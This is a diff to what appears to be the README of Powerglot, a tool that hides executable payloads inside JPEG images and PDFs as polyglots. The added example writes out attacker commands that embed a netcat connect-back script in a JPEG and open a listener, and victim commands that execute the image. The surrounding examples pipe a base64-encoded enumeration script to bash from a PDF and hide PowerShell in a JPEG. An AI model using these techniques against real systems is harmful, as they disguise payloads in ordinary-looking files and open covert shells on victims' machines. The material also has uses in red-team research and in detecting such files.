@@ -39,9 +39,22 @@ Some examples to hide payloads using polyglots with Powerglot
 
 a) cat cat-linenum | bash
 b) chmod +x cat-linenum.jpeg; ./cat-linenum.jpeg
+
 ```
 ```
-# Example 3 - Polyglot in PDF (Ej-linenum.sh)
+# Example 3 - Hiding a cover-channel wiht netcat in a JPEG image
+
+# Attacker
+# echo "nc 127.0.0.1 4444" > netcat.sh
+# python3 powerglot.py -o netcat.sh cat.jpeg cat-netcat.jpeg
+# nc -nvlp 4444
+
+#Victim
+# chmod +x cat-netcat.jpg | ./cat-netcat.jpg
+
+```
+```
+# Example 4 - Polyglot in PDF (Ej-linenum.sh)
 # Create b64.sh with your favourite payload
 base64 Linenum.sh -w 0 > b64.sh
 # Edit b64.sh
@@ -55,7 +68,7 @@ echo "code in b64.sh" | base64 -d | bash;
 # cat test.pdf | bash or chmod +x test.pdf; ./test.pdf
 ```
 ```
-# Example 4 - Powershell in JPEG (polyglot)
+# Example 5 - Powershell in JPEG (polyglot)
 # python3 powerglot.py -o script.ps1 cat.jpeg cat-ps.jpeg
 # file cat-ps.jpeg
 # feh cat-ps.jpeg
